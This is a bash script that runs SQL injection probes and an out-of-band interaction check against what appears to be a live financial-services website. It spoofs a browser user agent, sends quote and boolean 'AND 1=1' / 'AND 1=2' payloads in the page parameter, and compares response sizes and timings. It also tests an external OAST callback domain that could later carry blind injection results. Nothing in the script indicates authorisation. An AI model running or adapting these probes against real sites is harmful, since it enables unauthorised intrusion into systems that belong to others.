#!/bin/bash
# IC15 vuln-scanning / injection pass
H="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
cd /work/ic15

echo "### VALIDATE OOB ORACLE (control: token never sent anywhere)"
for h in totallyrandomctrl9x7q3 www; do
  echo "-- dig $h"
  dig +short "$h.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in" A | head -5
done
echo "-- curl random host"
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" "http://totallyrandomctrl9x7q3.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/" --max-time 10

echo
echo "### BASELINE page=1 vs page=2 vs page=1'"
for v in 1 2 "1'" "2 AND 1=1" "2 AND 1=2"; do
  curl -s -o "pg_$(echo $v|tr -d " '=/").html" -w "page=[$v] code=%{http_code} size=%{size_download} t=%{time_total}\n" -A "$UA" "$H/?page=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$v")"
  sleep 3
done
